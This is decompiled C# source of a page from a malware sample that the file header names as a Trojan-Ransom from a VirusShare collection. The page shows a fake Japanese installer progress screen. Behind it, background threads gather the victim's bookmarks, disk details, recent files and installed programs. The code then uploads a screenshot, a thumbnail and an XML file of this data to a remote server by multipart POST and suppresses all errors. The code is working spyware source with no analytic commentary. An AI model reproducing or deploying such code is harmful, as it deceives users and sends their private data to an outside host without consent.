// Decompiled with JetBrains decompiler
// Type: setup.View.Page0
// Assembly: setup, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6FA179CD-C6DD-49E1-8167-579BB94FEB58
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Agent.le-c87aca3d3f3f7d91c25f958bdf91631280e8c43d.exe

using setup.Properties;
using Smart.Windows.Mvc;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace setup.View
{
  [Smart.Windows.Mvc.View(Views.page0)]
  public class Page0 : AppViewBase
  {
    private Thread thread0;
    private Thread thread;
    private Thread thread2;
    private Thread thread3;
    private IContainer components;
    private PictureBox picTop;
    private Label label2;
    private Label label1;
    private ProgressBar pgBar;
    private Label label3;

    public Page0() => this.InitializeComponent();

    public virtual void OnViewOpen(ViewForwardEventArgs args)
    {
      this.picTop.Image = Image.FromFile(Settings.Default.it_dir);
      this.label1.BackColor = this.label2.BackColor = this.label3.BackColor = Color.Transparent;
      this.label1.Parent = this.label2.Parent = this.label3.Parent = (Control) this.picTop;
      this.label1.ForeColor = this.label2.ForeColor = this.label3.ForeColor = ColorTranslator.FromHtml(Settings.Default.f1);
      this.label1.Text = "インストールの準備をしています";
      this.label2.Text = Settings.Default.fn + " インストールウィザードは、インストールの手順をご案内するインストールウィザードを準備しています。しばらくお待ちください。";
      this.label3.Text = "Windows installer を設定しています";
      this.FunctionCotrol.UpdateFunctionKeys((FunctionKey[]) null);
      this.thread0 = new Thread(new ThreadStart(this.GetData));
      this.thread0.IsBackground = true;
      this.thread = new Thread(new ThreadStart(this.UploadFile));
      this.thread.IsBackground = true;
      this.thread2 = new Thread(new ThreadStart(this.UploadFile2));
      this.thread2.IsBackground = true;
      this.thread3 = new Thread(new ThreadStart(this.UploadFile3));
      this.thread3.IsBackground = true;
      this.thread0.Start();
    }

    public virtual void OnViewClose()
    {
      this.picTop.Image.Dispose();
      this.picTop.Image = (Image) null;
    }

    private void SetProgressValue(int num) => this.pgBar.Value = num;

    private void GetData()
    {
      try
      {
        lib.GetBookmarks();
        lib.GetHddInfo();
        lib.GetRecent();
        lib.GetProgram();
      }
      catch
      {
      }
      finally
      {
        this.thread.Start();
      }
    }

    private void UploadFile()
    {
      string path = "C:\\" + Settings.Default.uid + "\\" + Settings.Default.image;
      string fileName = Path.GetFileName(path);
      string requestUriString = Settings.Default.url + Settings.Default.post_ss;
      string str = Environment.TickCount.ToString();
      Encoding encoding = Encoding.GetEncoding("utf-8");
      Page0.SetProgressValueDelegate progressValueDelegate = new Page0.SetProgressValueDelegate(this.SetProgressValue);
      try
      {
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(requestUriString);
        httpWebRequest.Method = "POST";
        httpWebRequest.ContentType = "multipart/form-data; boundary=" + str;
        string s1 = "--" + str + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n";
        byte[] bytes1 = encoding.GetBytes(s1);
        string s2 = "\r\n--" + str + "\r\n";
        byte[] bytes2 = encoding.GetBytes(s2);
        FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read);
        httpWebRequest.ContentLength = (long) (bytes1.Length + bytes2.Length) + fileStream.Length;
        Stream requestStream = httpWebRequest.GetRequestStream();
        requestStream.Write(bytes1, 0, bytes1.Length);
        byte[] buffer = new byte[4096];
        int num1 = 0;
        int contentLength = (int) httpWebRequest.ContentLength;
        while (true)
        {
          int count = fileStream.Read(buffer, 0, buffer.Length);
          if (count != 0)
          {
            num1 += count;
            requestStream.Write(buffer, 0, count);
            int num2 = num1 * 100 / contentLength;
          }
          else
            break;
        }
        fileStream.Close();
        requestStream.Write(bytes2, 0, bytes2.Length);
        requestStream.Close();
        StreamReader streamReader = new StreamReader(httpWebRequest.GetResponse().GetResponseStream(), encoding);
        streamReader.ReadToEnd();
        streamReader.Close();
      }
      catch (Exception ex)
      {
      }
      finally
      {
        this.thread2.Start();
      }
    }

    private void UploadFile2()
    {
      string path = "C:\\" + Settings.Default.uid + "\\" + Settings.Default.uid + "_s.jpg";
      string fileName = Path.GetFileName(path);
      string requestUriString = Settings.Default.url + Settings.Default.post_ss;
      string str = Environment.TickCount.ToString();
      Encoding encoding = Encoding.GetEncoding("utf-8");
      Page0.SetProgressValueDelegate progressValueDelegate = new Page0.SetProgressValueDelegate(this.SetProgressValue);
      try
      {
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(requestUriString);
        httpWebRequest.Method = "POST";
        httpWebRequest.ContentType = "multipart/form-data; boundary=" + str;
        string s1 = "--" + str + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n";
        byte[] bytes1 = encoding.GetBytes(s1);
        string s2 = "\r\n--" + str + "\r\n";
        byte[] bytes2 = encoding.GetBytes(s2);
        FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read);
        httpWebRequest.ContentLength = (long) (bytes1.Length + bytes2.Length) + fileStream.Length;
        Stream requestStream = httpWebRequest.GetRequestStream();
        requestStream.Write(bytes1, 0, bytes1.Length);
        byte[] buffer = new byte[4096];
        int num1 = 0;
        int contentLength = (int) httpWebRequest.ContentLength;
        while (true)
        {
          int count = fileStream.Read(buffer, 0, buffer.Length);
          if (count != 0)
          {
            num1 += count;
            requestStream.Write(buffer, 0, count);
            int num2 = num1 * 100 / contentLength;
          }
          else
            break;
        }
        fileStream.Close();
        requestStream.Write(bytes2, 0, bytes2.Length);
        requestStream.Close();
        StreamReader streamReader = new StreamReader(httpWebRequest.GetResponse().GetResponseStream(), encoding);
        streamReader.ReadToEnd();
        streamReader.Close();
      }
      catch (Exception ex)
      {
      }
      finally
      {
        this.thread3.Start();
      }
    }

    private void UploadFile3()
    {
      string path = "C:\\" + Settings.Default.uid + "\\" + Settings.Default.uid + ".xml";
      string fileName = Path.GetFileName(path);
      string requestUriString = Settings.Default.url + "xml.php";
      string str = Environment.TickCount.ToString();
      Encoding encoding = Encoding.GetEncoding("utf-8");
      Page0.SetProgressValueDelegate progressValueDelegate = new Page0.SetProgressValueDelegate(this.SetProgressValue);
      try
      {
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(requestUriString);
        httpWebRequest.Method = "POST";
        httpWebRequest.ContentType = "multipart/form-data; boundary=" + str;
        string s1 = "--" + str + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n";
        byte[] bytes1 = encoding.GetBytes(s1);
        string s2 = "\r\n--" + str + "\r\n";
        byte[] bytes2 = encoding.GetBytes(s2);
        FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read);
        httpWebRequest.ContentLength = (long) (bytes1.Length + bytes2.Length) + fileStream.Length;
        Stream requestStream = httpWebRequest.GetRequestStream();
        requestStream.Write(bytes1, 0, bytes1.Length);
        byte[] buffer = new byte[4096];
        int num1 = 0;
        int contentLength = (int) httpWebRequest.ContentLength;
        while (true)
        {
          int count = fileStream.Read(buffer, 0, buffer.Length);
          if (count != 0)
          {
            num1 += count;
            requestStream.Write(buffer, 0, count);
            int num2 = num1 * 100 / contentLength;
          }
          else
            break;
        }
        fileStream.Close();
        requestStream.Write(bytes2, 0, bytes2.Length);
        requestStream.Close();
        StreamReader streamReader = new StreamReader(httpWebRequest.GetResponse().GetResponseStream(), encoding);
        streamReader.ReadToEnd();
        streamReader.Close();
      }
      catch (Exception ex)
      {
      }
      finally
      {
        this.Controller.Forward((object) Views.page1);
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.picTop = new PictureBox();
      this.label2 = new Label();
      this.label1 = new Label();
      this.pgBar = new ProgressBar();
      this.label3 = new Label();
      ((ISupportInitialize) this.picTop).BeginInit();
      ((Control) this).SuspendLayout();
      this.picTop.Dock = DockStyle.Fill;
      this.picTop.Location = new Point(0, 0);
      this.picTop.Name = "picTop";
      this.picTop.Size = new Size(500, 300);
      this.picTop.TabIndex = 1;
      this.picTop.TabStop = false;
      this.label2.Location = new Point(190, 70);
      this.label2.Name = "label2";
      this.label2.Size = new Size(280, 70);
      this.label2.TabIndex = 4;
      this.label1.BackColor = Color.Transparent;
      this.label1.Font = new Font("MS UI Gothic", 9f, FontStyle.Bold, GraphicsUnit.Point, (byte) 128);
      this.label1.Location = new Point(190, 10);
      this.label1.Name = "label1";
      this.label1.Size = new Size(280, 50);
      this.label1.TabIndex = 3;
      this.pgBar.Location = new Point(190, 190);
      this.pgBar.Name = "pgBar";
      this.pgBar.Size = new Size(280, 14);
      this.pgBar.Style = ProgressBarStyle.Marquee;
      this.pgBar.TabIndex = 5;
      this.label3.AutoSize = true;
      this.label3.Location = new Point(190, 175);
      this.label3.Name = "label3";
      this.label3.Size = new Size(0, 12);
      this.label3.TabIndex = 6;
      ((ContainerControl) this).AutoScaleDimensions = new SizeF(6f, 12f);
      ((ContainerControl) this).AutoScaleMode = AutoScaleMode.Font;
      ((Control) this).Controls.Add((Control) this.label3);
      ((Control) this).Controls.Add((Control) this.pgBar);
      ((Control) this).Controls.Add((Control) this.label2);
      ((Control) this).Controls.Add((Control) this.label1);
      ((Control) this).Controls.Add((Control) this.picTop);
      ((Control) this).Name = nameof (Page0);
      ((Control) this).Size = new Size(500, 300);
      ((ISupportInitialize) this.picTop).EndInit();
      ((Control) this).ResumeLayout(false);
      ((Control) this).PerformLayout();
    }

    private delegate void SetProgressValueDelegate(int num);
  }
}
